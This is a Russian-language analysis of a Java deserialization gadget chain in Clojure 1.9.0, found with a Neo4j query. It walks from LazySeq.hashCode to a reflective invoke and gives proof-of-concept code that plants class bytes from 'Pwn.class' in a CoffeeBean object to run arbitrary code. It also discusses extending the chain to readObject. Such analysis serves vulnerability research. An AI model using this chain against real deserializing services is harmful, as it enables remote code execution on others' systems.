# Анализ запроса neo4j для пакета clojure.1.9.0

## Пример работы
Рассмотрим запрос 
```
    match (sink:Method {NAME:"invoke",IS_SINK:true})<-[:CALL]-(m2:Method {NAME:"invoke"})-[:ALIAS]-(m3:Method)-[:ALIAS]-(m4:Method)<-[:CALL]-(m5:Method {NAME:"sval"})<-[:CALL]-(m6:Method {NAME:"seq"})<-[:CALL]-(m7:Method {NAME:"hashCode"})
    return * 

```

Посмотрим на выданную neoj4 цепочку методов:
+ Цепочка начинается с вызова *hashCode* класса `LazySeq`, а заканчивается вызовом метода *invoke

```
clojure.lang.LazySeq.hashCode()

    public int hashCode() {
        ISeq s = this.seq();
        return s == null ? 1 : Util.hash(s);
    }
```
+ В этом методе сразу же вызывается метод *seq*. Он же и является следующим методом в цепочке.
```
clojure.lang.LazySeq.seq()

    public final synchronized ISeq seq() {
        this.sval();
        if (this.sv != null) {
            Object ls = this.sv;

            for(this.sv = null; ls instanceof LazySeq; ls = ((LazySeq)ls).sval()) {
            }

            this.s = RT.seq(ls);
        }

        return this.s;
    }

```
+ Следующим интересующим нас методом является метод *sval*, который вновь вызывается в первой строчке без каких-либо условий.
```
clojure.lang.LazySeq.sval() 

    final synchronized Object sval() {
        if (this.fn != null) {
            this.sv = this.fn.invoke();
            this.fn = null;
        }

        return this.sv != null ? this.sv : this.s;
    }
```
+ Здесь нас интересует вызов метода *invoke* интерфейса `IFn`. В цепочке же используется реализация этого интерфейса в виде класса `core$bean$fn__6906$fn__6907`. Для вызова метода *invoke* у нас стоит лишь ограничение, что хранимый объект класса `IFfn` не является *null*, что для нас не проблема, так как мы хотим у этого объекта вызывать методы.
```
clojure.lang.core$bean$fn__6906$fn__6907.invoke() 

    public Object invoke() {
        Class var10000 = (Class)((PropertyDescriptor)this.pd).getPropertyType();
        Object var10001 = ((Method)this.method).invoke(this.x, (Object[])null);
        Object var1 = null;
        return Reflector.prepRet(var10000, var10001);
    }
```
+ Вот и последний вызов *invoke*, с помощью которого можно вызвать произвольный код. Для начала обратим внимание на поля класса. Все поля имеют тип `Object`, однако ко многим применятеся каст к другим типам. Поле *pd* должно являться типом `PropertyDescriptor` для успешного каста. Можно заметить, что переменная *var10000* никак не влияет на последующий *invoke*, поэтому там может находиться всё, что угодно, что не вызывает исключений. Поля *method* и *x* непосредственно и нужны для *invoke*: для объекта *x* вызывается метод *method*. Из ограничений имеются каст *method* к `Method` (вполне очевидно) и то, что вызывать мы умеем лишь те методы, у которых нет аргументов (так как в агрументы передаётся *Object[])null*).

### Требования к LazySeq
Как итог, мы хотим, чтобы внутри `LazySeq` лежал проинициализированный `core$bean$fn__6906$fn__6907`, внутри которого
- поле *pd* можно было прикастовать к `PropertyDescriptor`
- класс поля *x* имел метод *method*, у которого нет аргуметов.
Кроме того все классы, которые мы используем должны быть сериализуемы

### Пример составления эксплойта
В качестве вызываемого метода можно взять метод *toString* класса `CoffeBean` из пакета b4bycoffee. Тогда нам необходимо создать объект класса `CoffeBean`, положить в поле с массивом байт необходимые байты для создания класса с вызовом произвольного кода, после чего положить этот экземпляр класса в `core$bean$fn__6906$fn__6907`, вместе с методом и любым дескриптором. Осталось лишь положить всё это в `LazySeq` Вот пример данного кода:

```
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception{
        CoffeeBean toStringBean = new CoffeeBean();
        Class c = toStringBean.getClass();
        Method toString = c.getMethod("toString");
        BeanInfo info = Introspector.getBeanInfo(c);
        PropertyDescriptor pd = info.getPropertyDescriptors()[0];
        Field classByteField = c.getDeclaredField("ClassByte");
        classByteField.setAccessible(true);
        byte[] bytes = Files.readAllBytes(Paths.get("tmp/Pwn.class"));
        classByteField.set(toStringBean,bytes);
        core$bean$fn__6906$fn__6907 fn__6906$fn__6907 = new core$bean$fn__6906$fn__6907(toStringBean, toString, pd);
        LazySeq lazySeq = new LazySeq(fn__6906$fn__6907);
        lazySeq.hashCode();
    }
```
### Расширение начала цепочки до readObject

Вознокает желание начинать не с метода *hashCode*, а с метода *readObject*. Для этого можно экземпляр класса `LazySeq` положить в `HashMap`. Тогда во время *readObject* как раз вызовется необходимый *hashCode*. Прооблемой же является тот факт, что нам экземпляр класса `Method` не является `Serializable`, из-за чего у нас не получится азписать такой объект.

